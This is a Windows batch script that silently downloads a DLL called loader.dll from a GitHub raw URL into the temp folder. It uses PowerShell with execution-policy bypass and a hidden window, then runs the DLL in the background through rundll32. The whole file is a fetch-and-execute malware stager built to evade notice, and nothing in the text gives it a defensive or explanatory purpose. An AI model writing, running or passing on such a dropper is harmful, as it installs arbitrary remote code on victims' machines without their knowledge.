@echo off
set DLL_URL=https://raw.githubusercontent.com/kofta0000/testman/main/loader.dll
set DLL_PATH=%TEMP%\loader.dll
set FUNCTION=DllRegisterServer

:: Download the DLL silently using PowerShell
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%DLL_URL%', '%DLL_PATH%')"

:: Run the DLL silently
start /B rundll32.exe %DLL_PATH%,%FUNCTION%

exit
